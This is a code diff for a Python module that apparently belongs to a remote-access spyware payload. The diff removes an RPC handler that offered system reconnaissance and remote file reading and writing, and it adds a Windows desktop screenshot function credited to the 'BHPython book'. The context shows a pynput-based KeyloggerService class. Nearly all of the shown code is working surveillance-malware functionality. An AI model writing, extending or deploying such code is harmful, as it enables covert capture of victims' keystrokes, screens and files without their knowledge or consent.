@@ -6,95 +6,25 @@ import datetime
 
 from pynput import keyboard
 
-from . import rpc
 
+def screenshot(name):
+    # From BHPython book.
+    hdesktop = win32gui.GetDesktopWindow()
+    width, height, left, top = get_dimensions()
 
-class PayloadRPCHandler(rpc.RPCHandler):
+    desktop_dc = win32gui.GetWindowDC(hdesktop)
+    img_dc = win32ui.CreateDCFromHandle(desktop_dc)
+    mem_dc = img_dc.CreateCompatibleDC()
 
-    def rpc_dir(self):
-        return list(self._functions)
+    screenshot = win32ui.CreateBitmap()
+    screenshot.CreateCompatibleBitmap(img_dc, width, height)
+    mem_dc.SelectObject(screenshot)
+    mem_dc.BitBlt((0, 0), (width, height),
+            img_dc, (left, top), win32con.SRCCOPY)
+    screenshot.SaveBitmapFile(mem_dc, '{}.bmp'.format(name))
 
-    def rpc_echo(self, s):
-        return s
-
-
-def uname():
-    import platform
-    return platform.uname()
-
-
-def get_file_size(path):
-    import os
-    return os.path.getsize(path)
-
-
-def get_username():
-    import getpass
-    return getpass.getuser()
-
-
-def get_hostname():
-    import socket
-    return socket.gethostname()
-
-
-def get_platform():
-    import sys
-    return sys.platform
-
-
-def list_dir(path):
-    import os
-    return os.listdir(path)
-
-
-def change_dir(path):
-    import os
-    path = os.path.expanduser(path)
-    os.chdir(path)
-
-
-def get_current_dir():
-    import os
-    return os.getcwd()
-
-
-class FileOpener:
-
-    def __init__(self):
-        self.open_files = dict()
-
-    def open_file(self, path, mode='r'):
-        f = open(path, mode)
-        fid = id(f)
-        self.open_files[fid] = f
-        return fid
-
-    def close_file(self, fid):
-        if fid not in self.open_files:
-            return
-        f = self.open_files[fid]
-        f.close()
-        del self.open_files[fid]
-
-
-class FileReader:
-
-    def read_file(self, fid, size):
-        import base64
-        f = self.open_files[fid]
-        data = f.read(size)
-        return base64.urlsafe_b64encode(data)
-
-
-class FileWriter:
-
-    def write_file(self, fid, data):
-        import base64
-        f = self.open_files[fid]
-        data = base64.urlsafe_b64decode(data)
-        f.write(data)
-        f.flush()
+    mem_dc.DeleteDC()
+    win32gui.DeleteObject(screenshot.GetHandle())
 
 
 class KeyloggerService:
